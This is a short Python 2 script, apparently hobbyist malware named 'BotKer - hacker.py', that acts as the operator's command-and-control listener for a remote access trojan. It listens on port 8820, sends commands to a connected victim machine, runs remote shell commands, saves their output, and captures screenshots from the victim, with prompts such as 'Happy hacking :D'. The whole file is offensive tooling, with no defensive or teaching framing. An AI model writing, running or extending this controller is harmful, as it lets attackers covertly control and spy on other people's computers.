# -*- coding: utf-8 -*-
#################################
#                               #
#   Code by: VenoMScripT47      #
#   Start edit: 29/4/17         #
#   Last edit: /4/17            #
#                               #
#   BotKer - hacker.py          #
#################################
import socket
from time import strftime

loop='continue'
counter = 1

while loop != 'exit':
    if counter == 1:
        print "Welcome to BotKer.\nDevelop by VenoMScripT47"
    serverSocket = socket.socket()
    serverSocket.bind(('0.0.0.0', 8820))
    serverSocket.listen(1)
    if counter == 1:
        print "Listing for connection on port 8820.."
    (client_socket, client_address) = serverSocket.accept()
    if counter == 1:
        print "Connection establish.\nHappy hacking :D"
    command = raw_input('meterperetr >> ')
    client_socket.send(command)
    if command == 'cmd':
        cmd_command = raw_input('\tcmd >> ')
        client_socket.send(cmd_command)
        cmd_output = client_socket.recv(6011)
        file = open('cmd_output.txt', 'a').write("\n~~~~~~~~~" + strftime("%d-%m-%Y :->  %H:%M:%S") + "~~~~~~~~~\n" + cmd_output)

    if command == 'screenshot':
        recived = client_socket.recv(171098)
        file2jpg = open('screenshot.jpg', 'wb').write(recived)
    else:
        recived = client_socket.recv(4097)
        print recived
    counter +=1
    if command == 'destroy':
        loop = 'exit'

client_socket.close()
serverSocket.close()
